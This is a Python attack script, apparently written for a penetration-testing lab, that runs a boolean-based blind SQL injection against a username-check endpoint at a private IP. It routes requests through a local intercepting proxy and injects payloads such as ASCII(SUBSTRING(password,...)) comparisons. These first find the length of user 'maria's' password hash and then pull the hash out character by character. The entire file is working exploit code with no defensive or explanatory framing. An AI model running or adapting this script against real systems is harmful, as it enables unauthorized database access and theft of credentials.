import requests

# Target information
url = "http://10.129.204.197/api/check-username.php"
user = "maria"

# Proxy configuration
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Injection base payload
base_payload = f"{user}' AND ASCII(SUBSTRING(password,{{}},1))={{}}-- -"

def find_hash_length():
    print("[+] Determining the password hash length...")

    for length in range(1, 100):  # Assuming the hash length won't exceed 100 chars
        # Payload for finding hash length
        payload = f"{user}' AND len(password)={length}-- -"
        response = requests.get(url, params={"u": payload}, proxies=proxies, verify=False)
        
        # If the response indicates "taken", it means the condition is true
        if "taken" in response.text:
            print(f"[+] Hash length determined: {length}")
            return length

    raise Exception("[-] Could not determine hash length.")

def extract_hash_character(position):
    print(f"[*] Extracting character at position {position}...")

    for ascii_code in range(32, 127):  # Printable ASCII range
        payload = base_payload.format(position, ascii_code)
        response = requests.get(url, params={"u": payload}, proxies=proxies, verify=False)

        if "taken" in response.text:  # Adjust if response changes
            print(f"[+] Found character at position {position}: {chr(ascii_code)}")
            return chr(ascii_code)

    raise Exception(f"[-] Character not found at position {position}.")

def extract_hash(hash_length):
    print("[+] Starting hash extraction...")

    hash_value = ""
    for position in range(1, hash_length + 1):
        hash_value += extract_hash_character(position)
        # Print the current state of the hash in progress
        print(f"[!] Hash so far: {hash_value}")

    return hash_value

if __name__ == "__main__":
    try:
        # Step 1: Get the length of the hash
        hash_length = find_hash_length()
        print(f"\n[+] Extracted hash length: {hash_length}")

        # Step 2: Extract the full hash
        hash = extract_hash(hash_length)

        print(f"\n[+] Extracted hash: {hash}")
    except Exception as e:
        print(str(e))
